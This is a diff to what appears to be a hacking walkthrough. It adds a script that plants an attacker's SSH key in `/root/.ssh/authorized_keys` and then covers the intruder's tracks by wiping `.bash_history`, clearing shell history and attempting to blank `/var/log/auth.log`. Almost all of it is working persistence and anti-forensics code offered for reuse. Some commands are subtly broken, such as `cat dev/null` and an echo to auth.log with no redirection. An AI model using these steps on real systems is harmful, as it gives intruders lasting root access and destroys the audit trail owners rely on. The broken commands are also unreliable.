@@ -17,9 +17,45 @@ $ ssh-keygen -t id_rsa
 ```
 
 ```
-$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3i4q1GqjA5Jg/Lr6axC2pjQBQ42I6ikBIWJyof+sLtOt/WzmEydeI9o0dIj1Tn7bFrCNdXjmIT/y8qW1p50QZ5xZ5pYRYmiFU26Ok
-AjR5axJXPtXaVHDsryXly6OJSxXDCQwniwHpfMYMLsDo2ZzCyKXbaPzCM1oq//x6Dh8H8C74FmByvjLOmKA2oY0NnFEHMmoHjoRPVBVU6hi8rbvNv9NgT/fk4w+bC2hYnGmBtYm1jf4S7Y+eQIBk
-6uu9qijlU23MkglpFMhWG8Do+V90+1hiIlKuzpKx0lvvnlW4VUOiWAprq6dPE1qtQdRIGxrchvpZLBIhswNSulFz2ALGxrpr1Reb9Zs4mQX1OUGaBAt+Ae6ChLfefUP8ExxRBoout0b2s/34a5Td
-6dTMMd9Qjcg3HuBRwmHawAN9ypIJyuTt3UxNUikiuJEF9uptUKJ89XOfTUFxEZK9KzMQ67SmpDnQSGZ9RPLqFzjKnKEztkpi6Wx98ehDypNioECVpYU= theblackthreat@theblackthreat" 
+$ echo "ssh-rsa AAAAB3NzaC1yc2EA************************************************************************************************************************
+********************************************************************************************************************************************************
+*******************************************************************************************************8ehDypNioECVpYU= theblackthreat@theblackthreat" 
 >> /root/.ssh/authorized_keys
 ```
+#You can create a script according to your requirment for my case I'm create script that can clear the footprint of mine 
+
+```
+$cat > shell.sh
+echo $(id)
+echo "ssh-rsa AAAAB3NzaC1yc2EA************************************************************************************************************************
+********************************************************************************************************************************************************
+*******************************************************************************************************8ehDypNioECVpYU= root@kali" 
+>> /root/.ssh/authorized_keys
+
+cat dev/null > ~/.bash_history
+history -c
+echo "" /var/log/auth.log //this will edit the text from null to the auth logs.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
